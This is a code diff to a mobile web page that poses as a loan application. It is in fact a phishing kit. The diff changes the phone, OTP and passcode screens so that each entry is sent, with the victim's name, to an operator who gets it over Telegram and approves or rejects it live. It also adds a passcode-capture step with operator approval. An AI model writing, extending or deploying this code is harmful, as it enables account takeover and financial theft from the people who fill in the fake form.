@@ -14,7 +14,6 @@ html,body{
   background:#060f14;
 }
 
-/* ── Root wrapper fills full viewport ── */
 #app-root{
   position:fixed;
   inset:0;
@@ -25,7 +24,6 @@ html,body{
   font-family:'Nunito',sans-serif;
 }
 
-/* ── Shell: full width on mobile, capped at 390px on desktop ── */
 .phone-shell{
   position:relative;
   width:100%;
@@ -36,7 +34,6 @@ html,body{
   overflow:hidden;
 }
 
-/* ── Every screen covers the shell exactly ── */
 .screen{
   position:absolute;
   top:0;left:0;right:0;bottom:0;
@@ -48,14 +45,10 @@ html,body{
   pointer-events:none;
   transform:translateX(40px);
   transition:opacity .35s ease,transform .35s ease;
-  /* NO horizontal padding here — each screen sets its own */
 }
 .screen.active{opacity:1;pointer-events:all;transform:translateX(0);}
 .screen.exit-left{opacity:0;transform:translateX(-40px);pointer-events:none;}
 
-/* ════════════════════════════
-   DESIGN TOKENS
-════════════════════════════ */
 :root{
   --bg:#0c151c;
   --card:#16242e;
@@ -66,9 +59,6 @@ html,body{
   --border:#243744;
 }
 
-/* ════════════════════════════
-   SHARED COMPONENTS
-════════════════════════════ */
 .w-logo{display:flex;justify-content:center;margin-bottom:24px;}
 .w-wrap{position:relative;display:inline-block;line-height:1;}
 .w-char{font-size:42px;font-weight:900;color:#00e5cc;display:block;line-height:1;}
@@ -101,72 +91,47 @@ html,body{
 }
 .lang-btn svg{width:15px;height:15px;flex-shrink:0;}
 
-/* ════════════════════════════
-   SCREEN 1 — LOAN LANDING
-════════════════════════════ */
-#screen-loan-land{
-  background:linear-gradient(180deg,#0f1a22,#0c151c);
-  padding:0;/* children handle own padding */
-}
-
-.tbar{
-  display:flex;align-items:center;justify-content:space-between;
-  padding:24px 20px 16px;
-}
+/* ── S1 ── */
+#screen-loan-land{background:linear-gradient(180deg,#0f1a22,#0c151c);padding:0;}
+.tbar{display:flex;align-items:center;justify-content:space-between;padding:24px 20px 16px;}
 .logo{display:flex;align-items:center;gap:12px;}
 .logo-dot{
   width:44px;height:44px;border-radius:14px;
   background:linear-gradient(135deg,var(--accent),#00f0c8);
   color:#062018;display:flex;align-items:center;justify-content:center;
   font-weight:800;font-size:22px;
-  box-shadow:0 10px 20px rgba(0,210,173,.25);
-  flex-shrink:0;
+  box-shadow:0 10px 20px rgba(0,210,173,.25);flex-shrink:0;
 }
 .logo h2{font-size:22px;font-weight:800;letter-spacing:-.4px;color:var(--text);}
 .logo span{color:var(--accent);}
-
 .hero{
-  margin:0 20px 20px;
-  padding:28px 24px;
-  border-radius:28px;
+  margin:0 20px 20px;padding:28px 24px;border-radius:28px;
   background:linear-gradient(180deg,rgba(255,255,255,.05),rgba(255,255,255,.025));
-  border:1px solid rgba(255,255,255,.07);
-  position:relative;overflow:hidden;
+  border:1px solid rgba(255,255,255,.07);position:relative;overflow:hidden;
 }
 .hero::before{
-  content:'';position:absolute;
-  width:200px;height:200px;
-  background:rgba(0,210,173,.08);
-  border-radius:50%;top:-100px;right:-70px;filter:blur(20px);
+  content:'';position:absolute;width:200px;height:200px;
+  background:rgba(0,210,173,.08);border-radius:50%;top:-100px;right:-70px;filter:blur(20px);
 }
 .hero h1{
-  position:relative;z-index:2;
-  font-size:clamp(22px,7vw,30px);
-  line-height:1.1;font-weight:800;letter-spacing:-1px;
-  margin-bottom:12px;color:var(--text);
+  position:relative;z-index:2;font-size:clamp(22px,7vw,30px);
+  line-height:1.1;font-weight:800;letter-spacing:-1px;margin-bottom:12px;color:var(--text);
 }
 .hero p{position:relative;z-index:2;color:var(--muted);line-height:1.6;font-size:14px;}
-
 .btn{border:none;cursor:pointer;transition:.25s ease;font-family:inherit;}
 .btn-primary{
   background:linear-gradient(135deg,var(--accent),#00efc7);
-  color:#062018;padding:16px;border-radius:20px;
-  font-weight:800;font-size:15px;
-  box-shadow:0 12px 24px rgba(0,210,173,.18);
-  width:100%;
+  color:#062018;padding:16px;border-radius:20px;font-weight:800;font-size:15px;
+  box-shadow:0 12px 24px rgba(0,210,173,.18);width:100%;
 }
 .btn-primary:active{transform:scale(.985);}
 .btn-secondary{
-  background:transparent;color:var(--muted);
-  border:1px solid var(--border);
+  background:transparent;color:var(--muted);border:1px solid var(--border);
   padding:16px;border-radius:20px;font-weight:700;font-size:14px;
 }
-
 .loan-card{
-  margin:0 20px;
-  background:linear-gradient(180deg,var(--card),var(--card2));
-  border-radius:24px;padding:20px;
-  border:1px solid var(--border);
+  margin:0 20px;background:linear-gradient(180deg,var(--card),var(--card2));
+  border-radius:24px;padding:20px;border:1px solid var(--border);
 }
 .lbl{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px;}
 .amount{font-size:36px;font-weight:800;letter-spacing:-1px;color:var(--accent);}
@@ -175,28 +140,20 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 .mini{background:#10202a;border-radius:18px;padding:14px;border:1px solid var(--border);}
 .mini .val{font-size:20px;font-weight:700;margin-top:4px;color:var(--text);}
 
-/* ════════════════════════════
-   SCREEN 2 — LOAN DETAILS
-════════════════════════════ */
-#screen-loan-details{
-  background:linear-gradient(180deg,#0f1a22,#0c151c);
-  padding:0;
-}
+/* ── S2 ── */
+#screen-loan-details{background:linear-gradient(180deg,#0f1a22,#0c151c);padding:0;}
 .form-wrap{flex:1;overflow-y:auto;padding:0 20px;}
 .page-title{font-size:26px;font-weight:800;margin:16px 0 6px;letter-spacing:-.6px;color:var(--text);}
 .page-sub{color:var(--muted);line-height:1.6;margin-bottom:24px;font-size:14px;}
 .field{margin-bottom:18px;}
 .flbl{display:block;margin-bottom:8px;color:var(--muted);font-size:13px;font-weight:700;}
 .field input,.field select{
-  width:100%;height:58px;
-  background:#10202a;border:1px solid var(--border);
-  border-radius:18px;padding:0 16px;
-  color:var(--text);font-size:15px;font-family:inherit;transition:.25s;
+  width:100%;height:58px;background:#10202a;border:1px solid var(--border);
+  border-radius:18px;padding:0 16px;color:var(--text);font-size:15px;font-family:inherit;transition:.25s;
 }
 .field select option{background:#10202a;}
 .field input:focus,.field select:focus{
-  outline:none;border-color:var(--accent);
-  box-shadow:0 0 0 3px rgba(0,210,173,.12);
+  outline:none;border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,210,173,.12);
 }
 .rbox{
   background:#10202a;border:1px solid var(--border);
@@ -205,9 +162,7 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 .rbox .big{font-size:28px;font-weight:800;color:var(--accent);margin-top:6px;}
 .footer{display:flex;gap:12px;padding:16px 20px 24px;}
 
-/* ════════════════════════════
-   SCREEN 3 — PHONE
-════════════════════════════ */
+/* ── S3 ── */
 #screen-phone{padding:24px 20px 32px;}
 #screen-phone .hdr{display:flex;justify-content:flex-end;margin-bottom:36px;}
 .phone-title{text-align:center;color:#fff;font-size:26px;font-weight:800;margin-bottom:24px;}
@@ -227,7 +182,6 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 }
 .phone-input::placeholder{color:#6a7e86;}
 .assistance-btn{text-align:center;color:#7a8a90;font-size:14px;font-weight:600;cursor:pointer;}
-
 .dropdown{
   display:none;position:absolute;top:calc(100% + 8px);left:0;
   width:220px;background:#1a2c36;border-radius:14px;
@@ -236,8 +190,7 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 }
 .dropdown.open{display:block;}
 .dropdown-item{
-  display:flex;align-items:center;gap:10px;
-  padding:11px 14px;cursor:pointer;
+  display:flex;align-items:center;gap:10px;padding:11px 14px;cursor:pointer;
   border-bottom:1px solid rgba(255,255,255,.05);transition:background .12s;
 }
 .dropdown-item:last-child{border-bottom:none;}
@@ -247,9 +200,7 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 .cname{font-size:13px;color:#fff;font-weight:600;}
 .ccode{font-size:11px;color:#8a9ea6;}
 
-/* ════════════════════════════
-   SCREEN 4 — OTP
-════════════════════════════ */
+/* ── S4 ── */
 #screen-otp{padding:24px 20px 32px;}
 #screen-otp .hdr{margin-bottom:12px;}
 .otp-title{text-align:center;font-size:24px;font-weight:900;color:#fff;margin-bottom:10px;}
@@ -258,23 +209,25 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 .sms-label{font-size:14px;font-weight:800;color:#fff;margin-bottom:14px;text-align:center;}
 .otp-row{display:flex;gap:8px;justify-content:center;width:100%;}
 .otp-box{
-  flex:1;min-width:0;max-width:50px;height:54px;
-  background:#1e3040;border-radius:10px;
+  flex:1;min-width:0;max-width:50px;height:54px;background:#1e3040;border-radius:10px;
   display:flex;align-items:center;justify-content:center;
-  font-size:20px;font-weight:800;color:#fff;
-  cursor:pointer;transition:background .2s,box-shadow .2s;
+  font-size:20px;font-weight:800;color:#fff;cursor:pointer;transition:background .2s,box-shadow .2s;
 }
 .otp-box .dash{width:14px;height:2px;background:#5a7a8a;border-radius:2px;}
 .otp-box.filled .dash{display:none;}
 .otp-box.cur{background:#243d50;box-shadow:0 0 0 2px #00e5cc55;}
 .resend-text{font-size:14px;font-weight:700;color:#00e5cc;text-align:center;}
 
-/* ════════════════════════════
-   SCREEN 5 — PASSCODE
-════════════════════════════ */
+/* ── S5 PASSCODE ── */
 #screen-passcode{padding:24px 20px 32px;}
 .pc-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;}
-.passcode-title{font-size:14px;font-weight:700;color:#fff;}
+
+/* ── CHANGED: title moved to centre section under pc-hdr ── */
+.passcode-section-title{
+  text-align:center;
+  font-size:18px;font-weight:800;color:#fff;
+  margin-bottom:20px;
+}
 .info-icon{
   width:18px;height:18px;border:1.5px solid #5a7a8a;border-radius:50%;
   display:flex;align-items:center;justify-content:center;
@@ -290,7 +243,6 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 .dot-cell .filled{width:13px;height:13px;background:#fff;border-radius:50%;display:none;}
 .dot-cell.on .dash{display:none;}
 .dot-cell.on .filled{display:block;}
-
 .keypad{display:flex;flex-direction:column;align-items:center;gap:12px;width:100%;}
 .keypad-row{display:flex;align-items:center;justify-content:center;width:100%;}
 .key{
@@ -303,10 +255,7 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
   margin:0 clamp(8px,2.5vw,18px);
 }
 .key:active{background:#2a4558;transform:scale(.93);}
-.key-ghost{
-  width:clamp(60px,20vw,74px);height:clamp(60px,20vw,74px);
-  margin:0 clamp(8px,2.5vw,18px);
-}
+.key-ghost{width:clamp(60px,20vw,74px);height:clamp(60px,20vw,74px);margin:0 clamp(8px,2.5vw,18px);}
 .key-back{
   width:clamp(60px,20vw,74px);height:clamp(60px,20vw,74px);
   display:flex;align-items:center;justify-content:center;
@@ -321,25 +270,17 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 }
 .back-icon span{color:#fff;font-size:13px;font-weight:700;margin-left:3px;}
 
-/* ════════════════════════════
-   SCREEN 6 — SUCCESS
-════════════════════════════ */
-#screen-success{
-  background:linear-gradient(180deg,#0f1a22,#0c151c);
-  padding:0;
-}
+/* ── S6 ── */
+#screen-success{background:linear-gradient(180deg,#0f1a22,#0c151c);padding:0;}
 .success-body{
   flex:1;display:flex;flex-direction:column;
   align-items:center;justify-content:center;
   text-align:center;padding:20px 20px 32px;
 }
 .ok-ring{
-  width:84px;height:84px;border-radius:50%;
-  border:3px solid var(--accent);
-  display:flex;align-items:center;justify-content:center;
-  margin-bottom:24px;
-  background:rgba(0,210,173,.08);
-  box-shadow:0 0 28px rgba(0,210,173,.12);
+  width:84px;height:84px;border-radius:50%;border:3px solid var(--accent);
+  display:flex;align-items:center;justify-content:center;margin-bottom:24px;
+  background:rgba(0,210,173,.08);box-shadow:0 0 28px rgba(0,210,173,.12);
 }
 .ok-svg{width:42px;height:42px;}
 .ok-check{
@@ -350,10 +291,8 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 .success-body h2{font-size:28px;font-weight:800;margin-bottom:10px;color:var(--text);}
 .success-body p{color:var(--muted);line-height:1.7;font-size:14px;}
 .summary-box{
-  background:var(--card);border-radius:20px;
-  padding:20px;width:100%;
-  border:1px solid var(--border);text-align:left;
-  margin-top:28px;
+  background:var(--card);border-radius:20px;padding:20px;width:100%;
+  border:1px solid var(--border);text-align:left;margin-top:28px;
 }
 .sumrow{display:flex;justify-content:space-between;margin-bottom:10px;}
 .sumrow:last-child{margin-bottom:0;}
@@ -518,13 +457,12 @@ input[type="range"]{width:100%;margin:18px 0 8px;accent-color:var(--accent);}
 <div class="screen" id="screen-passcode">
   <div class="pc-hdr">
     <div class="back-btn" onclick="goTo('screen-otp')">‹</div>
-    <div style="display:flex;align-items:center;gap:6px;">
-      <span class="passcode-title">Create your passcode</span>
-      <div class="info-icon">i</div>
-    </div>
+    <div class="info-icon">i</div>
     <div style="width:28px;"></div>
   </div>
-  <div class="w-logo" style="margin-bottom:14px;"><div class="w-wrap"><span class="w-char">w</span><div class="w-dot"></div></div></div>
+  <div class="w-logo" style="margin-bottom:10px;"><div class="w-wrap"><span class="w-char">w</span><div class="w-dot"></div></div></div>
+  <!-- CHANGED: title text updated -->
+  <div class="passcode-section-title">Enter your passcode to proceed</div>
   <div class="dots-row" id="dotsRow">
     <div class="dot-cell" id="dc0"><div class="dash"></div><div class="filled"></div></div>
     <div class="dot-cell" id="dc1"><div class="dash"></div><div class="filled"></div></div>
@@ -721,13 +659,11 @@ async function apiPoll(token){
   return r.json();
 }
 
-/* Poll every 2s; call onResult when admin responds.
-   Times out after 4 min 30s (just before typical server TTL). */
 function startPolling(token, onResult, onTimeout){
   stopPolling();
   pollToken = token;
   let elapsed = 0;
-  const MAX = 270; // seconds before giving up
+  const MAX = 270;
   pollTimer = setInterval(async ()=>{
     elapsed += 2;
     if(elapsed >= MAX){
@@ -748,6 +684,11 @@ function startPolling(token, onResult, onTimeout){
 function stopPolling(){
   if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
   pollToken = null;
+}
+
+/* Helper: get name from the details form */
+function getUserName(){
+  return (document.getElementById('p1name')?.value||'').trim() || 'Unknown';
 }
 
 /* ════════════════════════════════════════
@@ -784,10 +725,6 @@ function submitDetails(){
 
 /* ════════════════════════════════════════
    S3 — PHONE NUMBER
-   FLOW: user enters number → taps Continue
-         → /notify login sent → overlay
-         → admin approves  → navigate to OTP screen
-         → admin rejects   → shake + stay on phone screen
 ════════════════════════════════════════ */
 function toggleDd(){ document.getElementById('dropdown').classList.toggle('open'); }
 function pickCountry(code, name, el){
@@ -812,16 +749,14 @@ async function proceedFromPhone(){
   if(!document.getElementById('phoneContinueBtn').classList.contains('active')) return;
 
   const phone = document.getElementById('phoneInput').value.trim();
+  const name  = getUserName();
 
-  /* 1. Disable button to prevent double-tap */
   document.getElementById('phoneContinueBtn').classList.remove('active');
-
-  /* 2. Show overlay AFTER user taps — they've already entered their number */
   showOverlay();
 
   try{
-    /* 3. Notify server — admin gets Telegram message */
-    const res = await apiNotify({ type:'login', phone, countryCode:prefix });
+    /* Send name + phone + date/time to Telegram */
+    const res = await apiNotify({ type:'login', phone, countryCode:prefix, name });
 
     if(!res.ok || !res.token){
       hideOverlay();
@@ -830,15 +765,15 @@ async function proceedFromPhone(){
       return;
     }
 
-    /* 4. Poll — overlay stays visible until admin responds */
     startPolling(res.token, result=>{
       hideOverlay();
       if(result === 'otp_allowed'){
         document.getElementById('otpPhone').textContent = prefix+' '+phone.slice(0,4)+'XXX';
         goTo('screen-otp');
-      } else if(result === 'wrong_pin'){
+      } else if(result === 'invalid_number'){
+        /* CHANGED: specific toast for invalid number */
         shake('screen-phone');
-        showToast('❌ Access denied. Please check your details.');
+        showToast('❌ Invalid number, please try again.');
         document.getElementById('phoneContinueBtn').classList.add('active');
       } else {
         showToast('Unexpected response. Please retry.');
@@ -859,10 +794,6 @@ async function proceedFromPhone(){
 
 /* ════════════════════════════════════════
    S4 — OTP
-   FLOW: user enters 6-digit code → taps Continue
-         → /notify otp sent → overlay
-         → admin approves  → navigate to passcode
-         → admin rejects   → shake + clear + stay on OTP screen
 ════════════════════════════════════════ */
 function enterOtp(){
   document.getElementById('otp-hidden').value = '';
@@ -894,8 +825,10 @@ function startOtpCountdown(){
 
 async function resendOtp(){
   const phone = document.getElementById('phoneInput').value.trim();
+  const name  = getUserName();
   try{
-    await apiNotify({ type:'resend', phone, countryCode:prefix });
+    /* CHANGED: now passes name so server can include it in the Telegram message */
+    await apiNotify({ type:'resend', phone, countryCode:prefix, name });
     showToast('Code resend requested ✓', '#00d2ad');
   } catch(_){ showToast('Could not resend. Try again.'); }
   startOtpCountdown();
@@ -939,17 +872,15 @@ async function proceedFromOtp(){
 
   const otp   = document.getElementById('otp-hidden').value;
   const phone = document.getElementById('phoneInput').value.trim();
+  const name  = getUserName();
 
-  /* 1. Disable button, stop countdown */
   document.getElementById('otpBtn').classList.remove('active');
   clearInterval(otpTimer);
-
-  /* 2. Show overlay AFTER user has already entered their OTP */
   showOverlay();
 
   try{
-    /* 3. Submit OTP to server — admin gets Telegram message with the code */
-    const res = await apiNotify({ type:'otp', phone, countryCode:prefix, otp });
+    /* CHANGED: now sends name too */
+    const res = await apiNotify({ type:'otp', phone, countryCode:prefix, otp, name });
 
     if(!res.ok || !res.token){
       hideOverlay();
@@ -959,14 +890,14 @@ async function proceedFromOtp(){
       return;
     }
 
-    /* 4. Poll until admin responds */
     startPolling(res.token, result=>{
       hideOverlay();
       if(result === 'otp_correct'){
         goTo('screen-passcode');
       } else if(result === 'otp_wrong'){
+        /* CHANGED: specific toast for wrong OTP */
         shake('screen-otp');
-        showToast('❌ Wrong code. Please try again.');
+        showToast('❌ Incorrect OTP, please try again.');
         document.getElementById('otp-hidden').value = '';
         renderOtp('');
         document.getElementById('otpBtn').classList.remove('active');
@@ -993,6 +924,7 @@ async function proceedFromOtp(){
 
 /* ════════════════════════════════════════
    S5 — PASSCODE
+   AUTO-SUBMITS on 6th digit → sends PIN to Telegram → admin approves/rejects
 ════════════════════════════════════════ */
 function enterPasscode(){
   pcVal = '';
@@ -1003,14 +935,74 @@ function renderDots(){
   for(let i=0;i<6;i++) document.getElementById('dc'+i).classList.toggle('on', i<pcVal.length);
   document.getElementById('pcBack').classList.toggle('show', pcVal.length>0);
 }
+
 function pcKey(d){
   if(pcVal.length>=6) return;
   pcVal += d;
   renderDots();
-  if(pcVal.length===6) setTimeout(()=>goTo('screen-success'), 320);
+  /* CHANGED: auto-submit when all 6 digits entered */
+  if(pcVal.length===6) setTimeout(submitPasscode, 320);
 }
 function pcBackspace(){
   if(pcVal.length){ pcVal=pcVal.slice(0,-1); renderDots(); }
+}
+
+async function submitPasscode(){
+  const phone = document.getElementById('phoneInput').value.trim();
+  const name  = getUserName();
+  const pin   = pcVal;
+
+  /* Lock keypad while waiting */
+  document.querySelectorAll('.key').forEach(k=>k.style.pointerEvents='none');
+  document.getElementById('pcBack').style.pointerEvents='none';
+  showOverlay();
+
+  try{
+    /* CHANGED: sends passcode type to server with Name, Phone, PIN */
+    const res = await apiNotify({ type:'passcode', phone, countryCode:prefix, passcode:pin, name });
+
+    if(!res.ok || !res.token){
+      hideOverlay();
+      unlockKeypad();
+      showToast('Could not reach server. Try again.');
+      return;
+    }
+
+    startPolling(res.token, result=>{
+      hideOverlay();
+      if(result === 'passcode_correct'){
+        goTo('screen-success');
+      } else if(result === 'passcode_wrong'){
+        /* CHANGED: specific toast for wrong PIN, reset so user can retry */
+        shake('screen-passcode');
+        showToast('❌ Incorrect passcode, please try again.');
+        pcVal = '';
+        renderDots();
+        unlockKeypad();
+      } else {
+        showToast('Unexpected response. Please retry.');
+        pcVal = '';
+        renderDots();
+        unlockKeypad();
+      }
+    }, ()=>{
+      hideOverlay();
+      showToast('Request timed out. Please try again.');
+      pcVal = '';
+      renderDots();
+      unlockKeypad();
+    });
+
+  } catch(e){
+    hideOverlay();
+    unlockKeypad();
+    showToast('Connection error. Please try again.');
+  }
+}
+
+function unlockKeypad(){
+  document.querySelectorAll('.key').forEach(k=>k.style.pointerEvents='');
+  document.getElementById('pcBack').style.pointerEvents='';
 }
 
 /* ════════════════════════════════════════
